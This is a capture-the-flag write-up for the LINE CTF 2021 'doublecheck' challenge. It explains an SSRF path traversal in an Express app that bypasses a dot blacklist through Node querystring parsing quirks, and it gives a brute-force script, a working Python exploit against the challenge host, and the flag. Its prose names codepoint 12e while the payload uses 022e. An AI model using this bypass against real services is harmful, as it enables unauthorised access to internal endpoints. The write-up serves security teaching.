## [LINE CTF 2021] doublecheck  

<img src="images/chall.png" width=600>

The challenge server has a flag endpoint, but it can only be visited locally.  

```js
app.get('/flag', internalHandler, function (req, res, next) {
  const flag = process.env.FLAG || 'DH{****}'
  res.send(flag)
})

...

function internalHandler (req, res, next) {
  if (req.ip === '::ffff:127.0.0.1') next()
  else next(createError(403))
}
```

In the root endpoint, we can see an SSRF vuln, where we are allowed to supply a path which the server will visit.  

If we get the server to traverse to `../../../flag`, we win.  

```js
app.post('/', function (req, res, next) {
  const body = req.body
  if (typeof body !== 'string') return next(createError(400))

  if (validate(body)) return next(createError(403))
  const { p } = querystring.parse(body)
  if (validate(p)) return next(createError(403))

  try {
    http.get(`http://localhost:${port}/api/vote/` + encodeURI(p), r => {
      let chunks = ''
      r.on('data', (chunk) => {
        chunks += chunk
      })
      r.on('end', () => {
        res.send(chunks.toString())
      })
    })
  } catch (error) {
    next(createError(404))
  }
})
```

However, our main challenge is that the root endpoint also runs `validate()` on our path, which blacklists characters that are essential for the path traversal.  

```js
function validate (str) {
  return str.indexOf('.') > -1 || str.indexOf('%2e') > -1 || str.indexOf('%2E') > -1
}
```

There are two main checks we have to pass. The first validates our raw payload string, while the second validates the parsed path.  

```js
if (validate(body)) return next(createError(403))
const { p } = querystring.parse(body)
if (validate(p)) return next(createError(403))
```

Bypassing `validate(p)` is rather straightforward, we can exploit the `querystring` module's behaviour on JavaScript objects.  

If we pass multiple arguments under `p`, `querystring` will parse it as an array, causing the `indexOf()` check for blacklisted characters to always pass.  

```
p=a&p=/../../../flag    ->  http://localhost:3000/api/vote/a,/../../../flag
```

However, our next challenge would be bypassing `validate(body)`, as it checks our raw payload string. To do this, we need to abuse the internal behaviour of `querystring.parse()`.

An important thing to note about `querystring.parse` is that when it first calls `decodeURIComponent()` on the supplied string, and if the decoding fails, it will fall back to `querystring.unescape()`, which allows for multi-byte character decoding.  

If we are able to find a multi-byte character that gets decoded to `.` by `querystring.unescape()`, we can bypass the filter.  

We can write a simple script to bruteforce a range of unicode codepoints.  

```js
for (let i = 0; i < 1000; i++) {
    try {
        const char = String.fromCodePoint(i);

        if (char == '.')
            continue;

        const parsed = require("querystring").unescape(`%ff${char}`);
        
        if (parsed.includes("."))
            console.log(i.toString(16), parsed);
    } catch {}
}
```

One of the codepoints the script generates is `12e`, so we can use it to encode the `.` in our payload.  

Submitting our final payload to the server will then get us the flag.  

```python
import requests

url = "http://host3.dreamhack.games:19139/"

payload = f"p=a&p=%ff/../../../flag".replace('.', '\u022e')

res = requests.post(url, headers={'Content-Type': 'text/plain'}, data=payload)

print("Flag:", res.text)
```

Flag: `DH{e4e2817f24a2f022b8dd1608e4de4b36a4acf983}`